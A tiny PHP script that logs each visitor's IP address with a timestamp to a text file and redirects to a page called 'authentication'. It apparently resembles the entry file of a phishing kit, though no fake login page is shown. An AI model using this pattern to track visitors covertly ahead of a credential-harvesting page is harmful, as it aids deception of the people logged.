<?php
$ip = getenv("REMOTE_ADDR");
$file = fopen("ip.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$random = rand(0,100000).$_SERVER['REMOTE_ADDR'];
header("location: authentication");
exit;

?>